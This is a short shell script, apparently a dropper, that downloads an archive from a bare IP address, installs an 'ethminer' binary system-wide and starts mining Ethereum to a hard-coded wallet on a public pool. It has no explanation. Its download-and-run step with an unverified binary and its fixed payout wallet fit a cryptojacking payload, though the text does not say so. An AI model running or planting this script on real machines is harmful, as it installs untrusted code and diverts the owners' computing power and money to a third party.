#!/bin/sh
apt-get update -y; apt-get install -y tar; apt-get install wget; mkdir down; cd down; wget http://159.89.237.64/test.gz; tar -zxvf test.gz; cd bin; install -sv ethminer /usr/local/bin/; ./ethminer -RH --farm-recheck 200 -U -S us1.ethermine.org:4444 -u 0x80aa3fd787d820c8f47af90836028c5607a21158.goog5
